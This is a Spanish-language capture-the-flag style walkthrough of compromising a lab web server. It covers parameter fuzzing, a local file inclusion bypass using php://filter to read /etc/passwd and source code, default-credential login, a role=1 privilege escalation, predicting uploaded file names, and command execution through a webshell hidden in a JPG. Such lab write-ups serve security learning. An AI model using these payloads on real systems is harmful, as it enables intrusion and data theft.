PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Encontramos una parámetro haciendo Fuzzing:
	-ffuf -u 'http://10.10.11.135/image.php?FUZZ=images/user-icon.png' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fw 1
		**img**

-Nos vamos a la ruta descubirta y nos carga los metadatos de la Imagen:
	-http://10.10.11.135/image.php?img=images/user-icon.png
		-Muchos metadatos

-Probamos a ver el /etc/passwd mediande un Local File Inclusion (LFI):
	-http://10.10.11.135/image.php?img=/etc/passwd
		Hacking attempt detected!

## Local File Inclusion (LFI) - Wrappers 

-Probamos a listar el Contenido del archivo image.php con Wrappers:
	-http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=image.php
		-Cadena en Base64

-La decodificamos y vemos que tiene un filtro para validar lo que podemos listar:
	$blacklist = array("php://input", "phar://", "zip://", "ftp://", "file://", "http://", "data://", "expect://", "https://", "../");

-Como en este filtro no está incluyendo el wrapper 'php://filter', podemos **Explotar el LFI mediante Wrappers.**

-Probamos a Listar el /etc/passwd:
	-http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
		-Cadena en Base64
			-La decodificamos y lo VEMOS!!

-DATO CURIOSO: Si aplicamos el Filtro pero en vez de 'Convert64...' ponemos algo que no existe, listamos el /etc/passwd directamente, sin decodificar en base64:
	-http://10.10.11.135/image.php?img=php://filter/carpx0/resource=/etc/passwd
		-Vemos el /etc/passwd en texto claro
-----------------------------------------------------------------------------------------------------------

-Sabemos que existe un usuario llamado 'aaron', antes de probar un Ataque de Fuerza Bruta para averiguar su contraseña, probamos con su nombre de usuario
	-username: aaron
	-password: aaron
		FUNCIONA!! , Estamos Dentroo

-Pinchamos en la Pestaña de 'Edit Profile' , le damos a Update e Interceptamos la Petición
	-Se envían los siguiente parámetros:
		firstName=test&lastName=test&email=test&company=test

-Al darle a enviar, la web responde con el siguiente objeto, los datos mas relevantes son:
	    "id": "2",
	    "username": "aaron",
		"role": "0",

-Probamos a enviar el parámetro role=1 y le damos a Forward:
	firstName=test&lastName=test&email=test&company=test&**role=1**
		Forward

## Averiguamos el Nombre del Archivo

-Volvemos a la página y somos ADMIN, tenemos un apartado de 'Admin Panel' dónde podemos subir archivos. SOLO nos deja subir **Archivos JPG**.

-Aprovechando el LFI, vemos el Código fuente del Archivo que valida la subida de archivos:
	-http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php

-Esta es la lógica que sigue para nombrar los archivos que subimos:
	$file_hash = uniqid();
	$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
	if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    }

(Hay más código, esto es lo importante)

**-Vulnerabilidad en el Código:** **'$file_hash'** lo pone con **Comillas Simples**, lo cual hace que pille literalmente el texto 'file_hash' **Estáticamente**, en vez de pillar el **uniqid()** que se le asocia (en ese caso no podríamos saber cual es).

**-El archivo se Sube de la siguiente forma:** '$file_hash' + time() + '_'  + tmp_nombrearchivo

-time(): Función de php que recoge el tiempo actual en formato Epoch

-Para saber la Fecha Actual en la Máquina:
	-curl -s -X GET 'http://10.10.11.135' -I
		Date: Wed, 04 Jun 2025 09:30:55 GMT
		-I: Sirve para listar las Cabeceras

-Para Construir el nombre del Archivo:
	1-Subimos el Archivo.jpg con la webshell desde BurpSuite
	2-En la Respuesta nos sale la Fecha de la Máquina, la copiamos
	1-Abrimos la terminal de php
		-php -a  o php --interactive
	2-Pasamos la fecha Actual de la Máquina a Formato UNIX:
		-php > $t = "Wed, 04 Jun 2025 10:55:03 GMT";
		-php > echo strtotime($t);
			1749032646
	3-El nombre Completo quedaría así:
		-php > echo md5('$file_hash' . strtotime($t)) . '_backdoor.jpg';
			689160b3e978f2cbd153dbd947917115_backdoor.jpg

## File Upload + LFI - RCE

**-NOTA:** Aunque el archivo es .jpg, cómo lo vamos a ejecutar a través del LFI, y este apunta al archivo **image.php**, el código php dentro de nuestro archivo.jpg se va a interpretar

-Aprovechamos el LFI para Apuntar a Nuestro Archivo y Ejecutar Comandos:
	-http://10.10.11.135/image.php?img=images/uploads/689160b3e978f2cbd153dbd947917115_backdoor.jpg&cmd=id
		**uid=33(www-data) gid=33(www-data) groups=33(www-data)**






